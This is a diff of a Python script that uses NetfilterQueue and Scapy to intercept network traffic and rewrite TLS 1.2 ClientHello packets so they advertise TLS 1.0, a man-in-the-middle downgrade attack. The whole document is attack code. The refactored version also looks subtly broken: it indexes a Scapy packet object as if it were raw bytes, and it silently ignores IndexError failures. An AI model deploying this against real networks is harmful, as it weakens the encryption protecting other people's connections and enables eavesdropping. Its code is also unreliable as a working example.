@@ -2,6 +2,8 @@
 #
 # With many thanks to Ludovic Barman for their great write-up.
 # https://lbarman.ch/blog/downgrade-tls/
+# This one thread on a Python forum was also helpful:
+# https://python-forum.io/Thread-NetfilterQueue-set-payload
 #
 # Also, thanks to Mike D. for teaching me how to join() to fix
 # the bytes for set_payload().
@@ -16,15 +18,14 @@ from scapy import *
 scapy_builtins = __import__('scapy.all', globals(), locals(),'.').__dict__
 __builtins__.__dict__.update(scapy_builtins)
 
-
 nfQueueID         = 0
 maxPacketsToStore = 100
 
 
-def downgradeTLS(packet):
+
+def processPacket(packet):
   print("...")
   scapy_packet = IP(packet.get_payload())
-
 
   if not scapy_packet.haslayer("Raw"):
     packet.accept();
@@ -35,57 +36,49 @@ def downgradeTLS(packet):
     # Adjusted the matching rules for Python 2 and old Scapy.
     if tcpPayload[0] == '\x16' and tcpPayload[1] == '\x03' and tcpPayload[5] == '\x01':
       print("TLS handshake found, client HELLO.")
-      
+
       if tcpPayload[9] == '\x03' and tcpPayload[10] == '\x03':
         print("TLS v1.2, dropping down to v1.0")
-        print("-----")
-        print(scapy_packet.summary()) 
-        print("-----")
-        print(scapy_packet.command()) 
-        print("-----")
-        print(scapy_packet.show()) 
-        print("-----")
+        print(scapy_packet.command())
 
-        msgBytes = packet.get_payload()        # msgBytes is read-only, copy it
-        msgBytes2 = [b for b in msgBytes]
-
-        print("msgB is: ", type(msgBytes))
-        print("msgB2 is: ", type(msgBytes2))
-        print("Byte 61 is now: ", msgBytes2[61], ". Needs to change to 0x03.")
-        print("Byte 62 is now: ", msgBytes2[62], ". Needs to change to 0x01.")
-
-        msgBytes2[61] = '\x03'
-        msgBytes2[62] = '\x01'
-
-        print("Byte 61 is now: ", msgBytes2[61], ".")
-        print("Byte 62 is now: ", msgBytes2[62], ".")
-        print(msgBytes2[0:65])
-
-        msg=b''.join(msgBytes2)
-        packet.set_payload(msg)
+        try:
+          scapy_packet = downgradeTLS(scapy_packet)
+        except IndexError:
+          # Something failed.
+          pass
+     
+        print("Here's the output:")
+        print(scapy_packet.command())
         
-        msg_tweak = IP(packet.get_payload())
-        del msg_tweak["IP"].chksum
-        del msg_tweak["TCP"].chksum
-        packet.set_payload(bytes(msg_tweak))                        
+        # set back as netfilter queue packet
+        packet.set_payload(bytes(scapy_packet))      
         
-        # Comparing to the original packet
-        scapy_packetchk = IP(packet.get_payload())
-        print("-----")
-        print(scapy_packetchk.command()) 
-        print("-----")
-        print(scapy_packetchk.show()) 
-        print("-----")
-
-
-      packet.accept()                                                                     
+      packet.accept()   
+    
     else:                                                                              
       packet.accept();
 
 
+
+
+def downgradeTLS(scapy_packet):
+  print("Position [61][62] was: ", scapy_packet[61], scapy_packet[62], ". Needs to change to 0x03 0x01.")
+
+  scapy_packet[61] = '\x03'
+  scapy_packet[62] = '\x01'
+
+  print("Position [61][62] is now: ", scapy_packet[61], scapy_packet[62], ".")
+  
+  del scapy_packet["IP"].chksum
+  del scapy_packet["TCP"].chksum
+
+  return scapy_packet
+
+
+
 print("Binding to NFQUEUE", nfQueueID)
 nfqueue = NetfilterQueue()
-nfqueue.bind(nfQueueID, downgradeTLS, maxPacketsToStore) # binds to queue 0, use handler "downgradeTLS()"
+nfqueue.bind(nfQueueID, processPacket, maxPacketsToStore)
 try:
     nfqueue.run()
 except KeyboardInterrupt:
